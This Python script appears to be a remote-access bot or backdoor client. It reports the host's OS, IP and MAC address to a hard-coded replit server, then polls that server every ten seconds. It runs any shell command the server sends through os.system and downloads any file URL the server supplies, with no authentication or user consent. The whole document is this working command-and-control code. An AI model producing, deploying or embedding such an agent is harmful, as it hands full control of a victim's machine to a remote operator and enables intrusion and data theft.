import requests as r
from time import sleep
import platform
import socket
import netifaces
import requests as requests
import json
import os
import threading

server_url = "https://practserver.kamakepar.repl.co"

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("8.8.8.8", 80))
ipaddr = (s.getsockname()[0])
s.close()

def download_file(url):
    local_filename = url.split('/')[-1]
    # NOTE the stream=True parameter below
    with requests.get(url, stream=True) as r:
        r.raise_for_status()
        with open(local_filename, 'wb') as f:
            for chunk in r.iter_content(chunk_size=8192): 
                # If you have chunk encoded response uncomment if
                # and set chunk_size parameter to None.
                #if chunk: 
                f.write(chunk)
    return local_filename

def get_mac_ip(ip):
	all_nets = netifaces.interfaces()
	for me in all_nets:
		try:
			if ip in str(netifaces.ifaddresses(me)):
				return netifaces.ifaddresses(me)[netifaces.AF_LINK][0]["addr"]
				pass
		except:
			pass
	return '00:00:00:00:00:00'

macaddr = get_mac_ip(ipaddr)

#all_nets = netifaces.interfaces()
#if len(all_nets)> 0:
#	if 'win' in platform.system().lower():
#		macaddr = netifaces.ifaddresses(all_nets[0])[netifaces.AF_LINK][0]["addr"]
#	else:
#		if 'linux' in platform.system().lower():
#			if all_nets[0] != 'lo':
#				macaddr = netifaces.ifaddresses(all_nets[0])[netifaces.AF_LINK][0]["addr"]
#			else:
#				macaddr = netifaces.ifaddresses(all_nets[len(all_nets)-1])[netifaces.AF_LINK][0]["addr"]
#else:
#	macaddr = '00:00:00:00:00:00'



try:
	conf = json.loads(open('config.json','r').read())
	pass
except:
	conf = {}
	conf["os"] = platform.system()
	conf["ip"] = ipaddr
	conf["mac"] = macaddr
	conf["id"] = r.post(server_url+"/get_id_fix_me", data={'os': platform.system(), 'ip': ipaddr, 'mac': macaddr}).text
	f = open('config.json','w')
	f.write(json.dumps(conf))
	f.close()
	pass

while True:
	to = (r.get(server_url+'/approve_me?id='+conf["id"]).text)
	if to == 'update':
		ids = conf["id"]
		conf = {}
		conf["os"] = platform.system()
		conf["ip"] = ipaddr
		conf["mac"] = macaddr
		conf["id"] = r.post(server_url+"/get_id_replace_me", data={'os': platform.system(), 'ip': ipaddr, 'mac': macaddr, 'id':ids}).text
		f = open('config.json','w')
		f.write(json.dumps(conf))
		f.close()
		r.get(server_url+'/query_sent?id='+conf["id"]).text
	if to == 'No user':
		ids = conf["id"]
		conf = {}
		conf["os"] = platform.system()
		conf["ip"] = ipaddr
		conf["mac"] = macaddr
		conf["id"] = r.post(server_url+"/get_id_replace_me", data={'os': platform.system(), 'ip': ipaddr, 'mac': macaddr, 'id':ids}).text
		f = open('config.json','w')
		f.write(json.dumps(conf))
		f.close()
		r.get(server_url+'/query_sent?id='+conf["id"]).text
	if 'cmd: ' in to:
		t = threading.Thread(target=os.system, args=(to.replace('cmd: ',''),));t.start()
		r.get(server_url+'/query_sent?id='+conf["id"]).text
	if 'download: ' in to:
		t = threading.Thread(target=download_file, args=(to.replace('download: ',''),));t.start()
		r.get(server_url+'/query_sent?id='+conf["id"]).text
	sleep(10)
